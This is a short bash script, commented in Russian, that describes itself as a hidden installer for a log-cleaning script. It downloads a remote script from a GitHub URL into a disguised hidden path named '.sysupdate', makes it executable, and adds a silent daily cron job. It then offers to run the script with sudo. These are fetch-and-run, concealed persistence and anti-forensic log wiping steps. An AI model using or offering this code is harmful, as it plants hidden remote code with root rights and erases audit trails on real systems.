#!/bin/bash

# Скрытая установка скрипта очистки логов

# Определяем скрытую директорию
HIDDEN_DIR="$HOME/.cache/system"
SCRIPT_NAME=".sysupdate"
SCRIPT_PATH="$HIDDEN_DIR/$SCRIPT_NAME"
SCRIPT_URL="https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh"

# Создаем скрытую директорию если её нет
mkdir -p "$HIDDEN_DIR" 2>/dev/null

# Скачиваем скрипт
if command -v curl &> /dev/null; then
    curl -fsSL "$SCRIPT_URL" -o "$SCRIPT_PATH"
elif command -v wget &> /dev/null; then
    wget -qO "$SCRIPT_PATH" "$SCRIPT_URL"
else
    echo "Error: curl or wget required"
    exit 1
fi

# Даем права на выполнение
chmod +x "$SCRIPT_PATH"

# Проверяем, не добавлен ли уже скрипт в crontab
if crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
    echo "Already installed"
    exit 0
fi

# Добавляем в crontab (каждый день в 00:00)
(crontab -l 2>/dev/null; echo "0 0 * * * $SCRIPT_PATH >/dev/null 2>&1") | crontab -

echo "Installed successfully"
echo "Location: $SCRIPT_PATH"
echo "Schedule: Daily at 00:00"

# Запускаем сразу (опционально)
read -p "Run now? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    sudo "$SCRIPT_PATH"
    echo "Done"
fi
